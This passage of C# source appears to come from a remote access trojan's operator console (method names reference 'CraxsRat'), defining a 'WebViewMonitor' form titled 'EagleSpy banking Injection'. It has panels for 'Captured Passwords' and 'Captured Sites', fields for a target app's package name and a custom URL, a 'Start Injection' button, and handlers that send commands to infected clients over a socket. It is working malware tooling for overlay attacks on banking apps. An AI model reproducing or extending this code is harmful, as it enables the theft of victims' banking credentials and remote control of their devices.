            this.datapanel.Size = new System.Drawing.Size(1169, 460);
            this.datapanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.datapanel.TabIndex = 1;
            this.datapanel.Text = "Captured Passwords";
            this.datapanel.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // datalogtext
            // 
            this.datalogtext.AutoWordSelection = true;
            this.datalogtext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.datalogtext.FillColor = System.Drawing.Color.Black;
            this.datalogtext.Font = new System.Drawing.Font("Calibri", 12F);
            this.datalogtext.ForeColor = System.Drawing.Color.White;
            this.datalogtext.Location = new System.Drawing.Point(0, 34);
            this.datalogtext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.datalogtext.Name = "datalogtext";
            this.datalogtext.Padding = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.datalogtext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(130)))), ((int)(((byte)(130)))), ((int)(((byte)(130)))));
            this.datalogtext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.datalogtext.RectSides = ((System.Windows.Forms.ToolStripStatusLabelBorderSides)(((System.Windows.Forms.ToolStripStatusLabelBorderSides.Left | System.Windows.Forms.ToolStripStatusLabelBorderSides.Right) 
            | System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom)));
            this.datalogtext.Size = new System.Drawing.Size(1169, 426);
            this.datalogtext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.datalogtext.StyleCustomMode = true;
            this.datalogtext.TabIndex = 0;
            // 
            // linkspanel
            // 
            this.linkspanel.Dock = System.Windows.Forms.DockStyle.Left;
            this.linkspanel.FillColor = System.Drawing.Color.Black;
            this.linkspanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.linkspanel.ForeColor = System.Drawing.Color.White;
            this.linkspanel.Location = new System.Drawing.Point(0, 50);
            this.linkspanel.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.linkspanel.Name = "linkspanel";
            this.linkspanel.Padding = new System.Windows.Forms.Padding(0, 34, 0, 0);
            this.linkspanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.linkspanel.Size = new System.Drawing.Size(379, 460);
            this.linkspanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.linkspanel.TabIndex = 2;
            this.linkspanel.Text = "Captured Sites";
            this.linkspanel.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // Panel8
            // 
            this.Panel8.BackColor = System.Drawing.Color.Black;
            this.Panel8.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel8.Location = new System.Drawing.Point(0, 0);
            this.Panel8.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel8.Name = "Panel8";
            this.Panel8.Size = new System.Drawing.Size(1548, 50);
            this.Panel8.TabIndex = 0;
            // 
            // Panel9
            // 
            this.Panel9.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel9.Location = new System.Drawing.Point(0, 510);
            this.Panel9.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel9.Name = "Panel9";
            this.Panel9.Size = new System.Drawing.Size(1548, 53);
            this.Panel9.TabIndex = 21;
            // 
            // comandcombo
            // 
            this.comandcombo.BackColor = System.Drawing.Color.Black;
            this.comandcombo.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.comandcombo.FillColor = System.Drawing.Color.Black;
            this.comandcombo.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.comandcombo.ForeColor = System.Drawing.Color.White;
            this.comandcombo.Items.AddRange(new object[] {
            "Add",
            "Remove",
            "Edit",
            "Clean"});
            this.comandcombo.Location = new System.Drawing.Point(181, 516);
            this.comandcombo.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.comandcombo.MinimumSize = new System.Drawing.Size(63, 0);
            this.comandcombo.Name = "comandcombo";
            this.comandcombo.Padding = new System.Windows.Forms.Padding(0, 0, 40, 0);
            this.comandcombo.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.comandcombo.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.comandcombo.Size = new System.Drawing.Size(159, 32);
            this.comandcombo.Style = DrakeUI.Framework.UIStyle.Custom;
            this.comandcombo.TabIndex = 48;
            this.comandcombo.Text = "Add";
            this.comandcombo.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // namescombo
            // 
            this.namescombo.BackColor = System.Drawing.Color.Black;
            this.namescombo.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.namescombo.FillColor = System.Drawing.Color.Black;
            this.namescombo.Font = new System.Drawing.Font("Calibri", 12F);
            this.namescombo.ForeColor = System.Drawing.Color.White;
            this.namescombo.Location = new System.Drawing.Point(75, 27);
            this.namescombo.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.namescombo.MinimumSize = new System.Drawing.Size(63, 0);
            this.namescombo.Name = "namescombo";
            this.namescombo.Padding = new System.Windows.Forms.Padding(0, 0, 40, 0);
            this.namescombo.Radius = 15;
            this.namescombo.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.namescombo.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.namescombo.Size = new System.Drawing.Size(259, 32);
            this.namescombo.Style = DrakeUI.Framework.UIStyle.Custom;
            this.namescombo.TabIndex = 47;
            this.namescombo.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            this.namescombo.SelectedIndexChanged += new System.EventHandler(this.Namescombo_SelectedIndexChanged);
            // 
            // commndbtn
            // 
            this.commndbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.commndbtn.FillColor = System.Drawing.Color.Black;
            this.commndbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.commndbtn.FillPressColor = System.Drawing.Color.Black;
            this.commndbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.commndbtn.Font = new System.Drawing.Font("Bahnschrift", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.commndbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.commndbtn.Location = new System.Drawing.Point(72, 593);
            this.commndbtn.Margin = new System.Windows.Forms.Padding(4);
            this.commndbtn.Name = "commndbtn";
            this.commndbtn.Radius = 25;
            this.commndbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.commndbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.commndbtn.RectHoverColor = System.Drawing.Color.White;
            this.commndbtn.RectPressColor = System.Drawing.Color.White;
            this.commndbtn.RectSelectedColor = System.Drawing.Color.White;
            this.commndbtn.Size = new System.Drawing.Size(377, 57);
            this.commndbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.commndbtn.Symbol = 61947;
            this.commndbtn.TabIndex = 20;
            this.commndbtn.Text = "Start Injection";
            this.commndbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon6_Click);
            // 
            // idtext
            // 
            this.idtext.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.idtext.FillColor = System.Drawing.Color.Black;
            this.idtext.Font = new System.Drawing.Font("Calibri", 12F);
            this.idtext.ForeColor = System.Drawing.Color.White;
            this.idtext.Location = new System.Drawing.Point(28, 167);
            this.idtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.idtext.Maximum = 2147483647D;
            this.idtext.Minimum = -2147483648D;
            this.idtext.Name = "idtext";
            this.idtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.idtext.Radius = 10;
            this.idtext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.idtext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.idtext.Size = new System.Drawing.Size(383, 32);
            this.idtext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.idtext.StyleCustomMode = true;
            this.idtext.TabIndex = 46;
            this.idtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
            this.idtext.Watermark = "App Package Name";
            // 
            // nametext
            // 
            this.nametext.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.nametext.FillColor = System.Drawing.Color.Black;
            this.nametext.Font = new System.Drawing.Font("Calibri", 12F);
            this.nametext.ForeColor = System.Drawing.Color.White;
            this.nametext.Location = new System.Drawing.Point(32, 37);
            this.nametext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.nametext.Maximum = 2147483647D;
            this.nametext.Minimum = -2147483648D;
            this.nametext.Name = "nametext";
            this.nametext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.nametext.Radius = 10;
            this.nametext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.nametext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.nametext.Size = new System.Drawing.Size(379, 32);
            this.nametext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.nametext.StyleCustomMode = true;
            this.nametext.TabIndex = 45;
            this.nametext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
            this.nametext.Watermark = "App Name";
            // 
            // linktext
            // 
            this.linktext.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.linktext.FillColor = System.Drawing.Color.Black;
            this.linktext.Font = new System.Drawing.Font("Calibri", 12F);
            this.linktext.ForeColor = System.Drawing.Color.White;
            this.linktext.Location = new System.Drawing.Point(32, 101);
            this.linktext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.linktext.Maximum = 2147483647D;
            this.linktext.Minimum = -2147483648D;
            this.linktext.Name = "linktext";
            this.linktext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.linktext.Radius = 10;
            this.linktext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.linktext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.linktext.Size = new System.Drawing.Size(379, 32);
            this.linktext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.linktext.StyleCustomMode = true;
            this.linktext.TabIndex = 44;
            this.linktext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
            this.linktext.Watermark = "Custom Url";
            // 
            // refbtn
            // 
            this.refbtn.BackColor = System.Drawing.Color.Black;
            this.refbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.refbtn.FillColor = System.Drawing.Color.Black;
            this.refbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.refbtn.Location = new System.Drawing.Point(292, 633);
            this.refbtn.Margin = new System.Windows.Forms.Padding(4);
            this.refbtn.Name = "refbtn";
            this.refbtn.Radius = 25;
            this.refbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.refbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.refbtn.Size = new System.Drawing.Size(133, 32);
            this.refbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.refbtn.StyleCustomMode = true;
            this.refbtn.Symbol = 61473;
            this.refbtn.TabIndex = 20;
            this.refbtn.Text = "Refresh";
            this.refbtn.Visible = false;
            this.refbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon7_Click);
            // 
            // savbtn
            // 
            this.savbtn.BackColor = System.Drawing.Color.Black;
            this.savbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.savbtn.FillColor = System.Drawing.Color.Black;
            this.savbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.savbtn.FillPressColor = System.Drawing.Color.Black;
            this.savbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.savbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.savbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.savbtn.Location = new System.Drawing.Point(433, 633);
            this.savbtn.Margin = new System.Windows.Forms.Padding(4);
            this.savbtn.Name = "savbtn";
            this.savbtn.Radius = 25;
            this.savbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.savbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.savbtn.RectHoverColor = System.Drawing.Color.White;
            this.savbtn.RectPressColor = System.Drawing.Color.White;
            this.savbtn.RectSelectedColor = System.Drawing.Color.White;
            this.savbtn.Size = new System.Drawing.Size(133, 32);
            this.savbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.savbtn.Symbol = 61717;
            this.savbtn.TabIndex = 24;
            this.savbtn.Text = "Saved";
            this.savbtn.Visible = false;
            this.savbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon9_Click);
            // 
            // clrbtn
            // 
            this.clrbtn.BackColor = System.Drawing.Color.Black;
            this.clrbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.clrbtn.FillColor = System.Drawing.Color.Black;
            this.clrbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.clrbtn.FillPressColor = System.Drawing.Color.Black;
            this.clrbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clrbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.clrbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clrbtn.Location = new System.Drawing.Point(9, 633);
            this.clrbtn.Margin = new System.Windows.Forms.Padding(4);
            this.clrbtn.Name = "clrbtn";
            this.clrbtn.Radius = 25;
            this.clrbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clrbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.clrbtn.RectHoverColor = System.Drawing.Color.White;
            this.clrbtn.RectPressColor = System.Drawing.Color.White;
            this.clrbtn.RectSelectedColor = System.Drawing.Color.White;
            this.clrbtn.Size = new System.Drawing.Size(133, 32);
            this.clrbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.clrbtn.Symbol = 61741;
            this.clrbtn.TabIndex = 23;
            this.clrbtn.Text = "Clear";
            this.clrbtn.Visible = false;
            this.clrbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon5_Click);
            // 
            // cpybtn
            // 
            this.cpybtn.BackColor = System.Drawing.Color.Black;
            this.cpybtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cpybtn.FillColor = System.Drawing.Color.Black;
            this.cpybtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.cpybtn.FillPressColor = System.Drawing.Color.Black;
            this.cpybtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.cpybtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.cpybtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.cpybtn.Location = new System.Drawing.Point(151, 633);
            this.cpybtn.Margin = new System.Windows.Forms.Padding(4);
            this.cpybtn.Name = "cpybtn";
            this.cpybtn.Radius = 25;
            this.cpybtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.cpybtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.cpybtn.RectHoverColor = System.Drawing.Color.White;
            this.cpybtn.RectPressColor = System.Drawing.Color.White;
            this.cpybtn.RectSelectedColor = System.Drawing.Color.White;
            this.cpybtn.Size = new System.Drawing.Size(133, 32);
            this.cpybtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.cpybtn.Symbol = 62029;
            this.cpybtn.TabIndex = 22;
            this.cpybtn.Text = "Copy";
            this.cpybtn.Visible = false;
            this.cpybtn.Click += new System.EventHandler(this.DrakeUIButtonIcon8_Click);
            // 
            // BWloader
            // 
            this.BWloader.DoWork += new System.ComponentModel.DoWorkEventHandler(this.BWloader_DoWork);
            // 
            // timeloader
            // 
            this.timeloader.Interval = 30;
            this.timeloader.Tick += new System.EventHandler(this.Timeloader_Tick);
            // 
            // Panel5
            // 
            this.Panel5.BackColor = System.Drawing.Color.Black;
            this.Panel5.Controls.Add(this.clinameinfo);
            this.Panel5.Controls.Add(this.ClientPic);
            this.Panel5.ForeColor = System.Drawing.Color.Red;
            this.Panel5.Location = new System.Drawing.Point(1700, 0);
            this.Panel5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel5.Name = "Panel5";
            this.Panel5.Size = new System.Drawing.Size(263, 39);
            this.Panel5.TabIndex = 6;
            // 
            // clinameinfo
            // 
            this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
            this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
            this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9F);
            this.clinameinfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clinameinfo.Location = new System.Drawing.Point(43, 0);
            this.clinameinfo.Name = "clinameinfo";
            this.clinameinfo.Size = new System.Drawing.Size(220, 39);
            this.clinameinfo.TabIndex = 12;
            this.clinameinfo.Text = "...";
            this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // ClientPic
            // 
            this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
            this.ClientPic.Location = new System.Drawing.Point(0, 0);
            this.ClientPic.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.ClientPic.Name = "ClientPic";
            this.ClientPic.Size = new System.Drawing.Size(43, 39);
            this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            this.ClientPic.TabStop = false;
            // 
            // sPanel1
            // 
            this.sPanel1.BackColor = System.Drawing.Color.Black;
            this.sPanel1.BorderColor = System.Drawing.Color.Red;
            this.sPanel1.BorderRadius = 6;
            this.sPanel1.BorderSize = 2;
            this.sPanel1.Controls.Add(this.label3);
            this.sPanel1.Controls.Add(this.label6);
            this.sPanel1.Controls.Add(this.drakeUIAvatar1);
            this.sPanel1.Controls.Add(this.label5);
            this.sPanel1.Controls.Add(this.label4);
            this.sPanel1.Controls.Add(this.sPanel3);
            this.sPanel1.Controls.Add(this.sPanel2);
            this.sPanel1.Controls.Add(this.comandcombo);
            this.sPanel1.Controls.Add(this.commndbtn);
            this.sPanel1.ForeColor = System.Drawing.Color.White;
            this.sPanel1.Location = new System.Drawing.Point(1696, 39);
            this.sPanel1.Margin = new System.Windows.Forms.Padding(4);
            this.sPanel1.Name = "sPanel1";
            this.sPanel1.Size = new System.Drawing.Size(68, 684);
            this.sPanel1.TabIndex = 50;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(95, 521);
            this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(67, 24);
            this.label3.TabIndex = 62;
            this.label3.Text = "Action";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.Location = new System.Drawing.Point(176, 116);
            this.label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(175, 24);
            this.label6.TabIndex = 61;
            this.label6.Text = "List of added Apps";
            // 
            // drakeUIAvatar1
            // 
            this.drakeUIAvatar1.FillColor = System.Drawing.Color.Black;
            this.drakeUIAvatar1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.drakeUIAvatar1.ForeColor = System.Drawing.Color.Lime;
            this.drakeUIAvatar1.Location = new System.Drawing.Point(4, 4);
            this.drakeUIAvatar1.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIAvatar1.Name = "drakeUIAvatar1";
            this.drakeUIAvatar1.Size = new System.Drawing.Size(80, 74);
            this.drakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIAvatar1.Symbol = 61852;
            this.drakeUIAvatar1.TabIndex = 60;
            this.drakeUIAvatar1.Text = "drakeUIAvatar1";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Bahnschrift", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.ForeColor = System.Drawing.Color.Lime;
            this.label5.Location = new System.Drawing.Point(79, 26);
            this.label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(423, 41);
            this.label5.TabIndex = 59;
            this.label5.Text = "EagleSpy banking Injection";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(175, 245);
            this.label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(204, 24);
            this.label4.TabIndex = 57;
            this.label4.Text = "Add / Modify Injection";
            // 
            // sPanel3
            // 
            this.sPanel3.BackColor = System.Drawing.Color.Black;
            this.sPanel3.BorderColor = System.Drawing.Color.Red;
            this.sPanel3.BorderRadius = 6;
            this.sPanel3.BorderSize = 1;
            this.sPanel3.Controls.Add(this.nametext);
            this.sPanel3.Controls.Add(this.linktext);
            this.sPanel3.Controls.Add(this.idtext);
            this.sPanel3.ForeColor = System.Drawing.Color.White;
            this.sPanel3.Location = new System.Drawing.Point(29, 258);
            this.sPanel3.Margin = new System.Windows.Forms.Padding(4);
            this.sPanel3.Name = "sPanel3";
            this.sPanel3.Size = new System.Drawing.Size(475, 226);
            this.sPanel3.TabIndex = 58;
            // 
            // sPanel2
            // 
            this.sPanel2.BackColor = System.Drawing.Color.Black;
            this.sPanel2.BorderColor = System.Drawing.Color.Red;
            this.sPanel2.BorderRadius = 6;
            this.sPanel2.BorderSize = 1;
            this.sPanel2.Controls.Add(this.drakeUIAvatar2);
            this.sPanel2.Controls.Add(this.namescombo);
            this.sPanel2.ForeColor = System.Drawing.Color.White;
            this.sPanel2.Location = new System.Drawing.Point(57, 130);
            this.sPanel2.Margin = new System.Windows.Forms.Padding(4);
            this.sPanel2.Name = "sPanel2";
            this.sPanel2.Size = new System.Drawing.Size(431, 76);
            this.sPanel2.TabIndex = 57;
            // 
            // drakeUIAvatar2
            // 
            this.drakeUIAvatar2.FillColor = System.Drawing.Color.Black;
            this.drakeUIAvatar2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.drakeUIAvatar2.ForeColor = System.Drawing.Color.Red;
            this.drakeUIAvatar2.Location = new System.Drawing.Point(372, 27);
            this.drakeUIAvatar2.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIAvatar2.Name = "drakeUIAvatar2";
            this.drakeUIAvatar2.Size = new System.Drawing.Size(39, 33);
            this.drakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIAvatar2.Symbol = 61666;
            this.drakeUIAvatar2.SymbolSize = 30;
            this.drakeUIAvatar2.TabIndex = 48;
            this.drakeUIAvatar2.Text = "drakeUIAvatar2";
            this.drakeUIAvatar2.Click += new System.EventHandler(this.drakeUIAvatar2_Click);
            // 
            // WebViewMonitor
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.ClientSize = new System.Drawing.Size(1537, 679);
            this.Controls.Add(this.sPanel1);
            this.Controls.Add(this.refbtn);
            this.Controls.Add(this.savbtn);
            this.Controls.Add(this.Panel3);
            this.Controls.Add(this.clrbtn);
            this.Controls.Add(this.cpybtn);
            this.Controls.Add(this.Panel5);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.Name = "WebViewMonitor";
            this.ShowIcon = false;
            this.Text = "WebViewMonitor";
            this.Panel1.ResumeLayout(false);
            this.Panel7.ResumeLayout(false);
            this.Panel6.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            this.Panel3.ResumeLayout(false);
            this.tabcontrols.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.vewimage)).EndInit();
            this.TabPage2.ResumeLayout(false);
            this.Panel4.ResumeLayout(false);
            this.Panel4.PerformLayout();
            this.TabPage3.ResumeLayout(false);
            this.datapanel.ResumeLayout(false);
            this.Panel5.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).EndInit();
            this.sPanel1.ResumeLayout(false);
            this.sPanel1.PerformLayout();
            this.sPanel3.ResumeLayout(false);
            this.sPanel2.ResumeLayout(false);
            this.ResumeLayout(false);

	}

	private void DrakeUITextBox1_MouseDown(object sender, MouseEventArgs e)
	{
		if (Conversions.ToBoolean(firstclick))
		{
			firstclick = false;
			TargetLink.Text = "";
		}
	}

	public WebViewMonitor()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry;
		base.FormClosing += WebViewMonitor_FormClosing;
		Title = "null";
		firstclick = true;
		MapData = new Dictionary<string, string>();
		y = 0;
		InitializeComponent();
	}

	public void PostData(string datastring)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			datalogtext.AppendText("> " + datastring + "\r\n");
		}));
	}

	public void addlinks(string lnk)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			Label label = new Label();
			label.Cursor = Cursors.Hand;
			label.Dock = DockStyle.Top;
			label.Font = new Font("Calibri", 14f);
			label.ForeColor = Color.Aqua;
			label.Size = new Size(631, 40);
			label.TabIndex = 0;
			label.Text = lnk;
			label.TextAlign = ContentAlignment.MiddleCenter;
			label.MouseClick += [SpecialName] (object sender2, MouseEventArgs eventargs2) =>
			{
				try
				{
					if (Classclient != null)
						try
						{
							string[] array = Classclient.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								Classclient.myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>g<*>" + label.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								Classclient
							};
							Classclient.SendMessage(parametersObjects);
							return;
						}
						catch (Exception)
						{
							//ProjectData.SetProjectError(projectError);
							//////CraxsAlert.Showinformation("Sorry");
							return;
						}
				}
				catch (Exception)
				{
					//ProjectData.SetProjectError(projectError2);
					//////CraxsAlert.Showinformation("Sorry");
				}
			};
			linkspanel.Controls.Add(label);
		}));
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx(object sender, EventArgs e)
	{
		if (Classclient == null)
			return;
